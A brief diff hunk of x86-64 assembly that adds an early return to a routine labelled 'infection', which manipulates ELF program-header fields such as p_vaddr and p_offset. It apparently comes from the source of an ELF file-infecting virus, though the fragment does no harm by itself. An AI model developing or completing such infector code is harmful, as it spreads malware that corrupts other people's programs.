@@ -778,6 +778,8 @@ infection:
 	jnz .loop
 
 	cmp r13, 1
+	je	.return
+
 	mov rax, [rel p_vaddr]
 	mov rdx, [rel p_offset]
 	call align_value
